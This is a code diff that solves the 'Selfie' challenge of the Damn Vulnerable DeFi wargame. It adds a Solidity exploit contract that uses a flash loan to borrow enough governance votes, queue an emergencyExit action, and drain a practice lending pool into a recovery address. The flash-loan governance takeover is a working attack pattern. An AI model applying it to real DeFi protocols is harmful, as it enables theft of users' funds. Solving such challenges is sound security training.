@@ -6,6 +6,8 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -62,7 +64,14 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        Exploit exploiter = new Exploit(
+            address(pool),
+            address(governance),
+            address(token)
+        );
+        exploiter.exploitSetup(address(recovery));
+        vm.warp(block.timestamp + 2 days);
+        exploiter.exploitCloseup();
     }
 
     /**
@@ -72,5 +81,49 @@ contract SelfieChallenge is Test {
         // Player has taken all tokens from the pool
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
         assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+    }
+}
+
+
+contract Exploit is IERC3156FlashBorrower{
+    SelfiePool selfiePool;
+    SimpleGovernance simpleGovernance;
+    DamnValuableVotes damnValuableToken;
+    uint actionId;
+    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
+    constructor(
+        address _selfiePool, 
+        address _simpleGovernance,
+        address _token
+    ){
+        selfiePool = SelfiePool(_selfiePool);
+        simpleGovernance = SimpleGovernance(_simpleGovernance);
+        damnValuableToken = DamnValuableVotes(_token);
+    }
+    function onFlashLoan(
+        address initiator,
+        address token,
+        uint256 amount,
+        uint256 fee,
+        bytes calldata data
+    ) external returns (bytes32){
+        damnValuableToken.delegate(address(this));
+        uint _actionId = simpleGovernance.queueAction(
+            address(selfiePool),
+            0,
+            data
+        );
+        actionId = _actionId;
+        IERC20(token).approve(address(selfiePool), amount+fee);
+        return CALLBACK_SUCCESS;
+    }
+
+    function exploitSetup(address recovery) external returns(bool){
+        uint amountRequired = 1_500_000e18;
+        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", recovery);
+        selfiePool.flashLoan(IERC3156FlashBorrower(address(this)), address(damnValuableToken), amountRequired, data);
+    }
+    function exploitCloseup() external returns(bool){
+        bytes memory resultData = simpleGovernance.executeAction(actionId);
     }
 }
